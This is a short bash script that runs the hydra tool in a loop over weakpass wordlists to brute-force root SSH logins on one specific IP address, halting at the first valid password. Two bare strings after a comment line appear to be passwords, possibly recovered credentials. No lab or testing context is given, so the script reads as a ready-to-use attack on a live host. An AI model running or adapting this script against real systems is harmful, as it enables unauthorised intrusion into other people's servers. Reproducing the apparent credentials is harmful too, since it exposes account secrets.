#!/bin/bash

for pass in weakpass_3_*.lst; do
/usr/bin/hydra -l root -w 10 -P ${pass} -t 4 -v -f 23.237.34.66 ssh
done



# WK2408040950KAFM7

2Stgk86TENG3
joker030